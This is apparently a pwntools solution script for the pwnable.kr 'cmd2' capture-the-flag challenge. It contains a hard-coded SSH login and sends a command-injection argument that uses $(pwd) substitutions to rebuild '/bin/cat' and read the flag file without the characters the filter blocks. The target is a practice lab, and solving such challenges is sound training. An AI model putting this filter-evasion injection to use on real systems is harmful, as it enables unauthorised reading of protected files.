#!/usr/bin/python3
from pwn import *

s = ssh('cmd2', 'pwnable.kr', 2222, 'mommy now I get what PATH environment is for :)')
sh = s.shell()

print(sh.recv().decode('ascii'))
sh.sendline('cd /')
time.sleep(1)

print(sh.recv().decode('ascii'))
sh.sendline('./home/cmd2/cmd2 \'$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*\'')
time.sleep(1)

print(sh.recv().decode('ascii'))

s.close()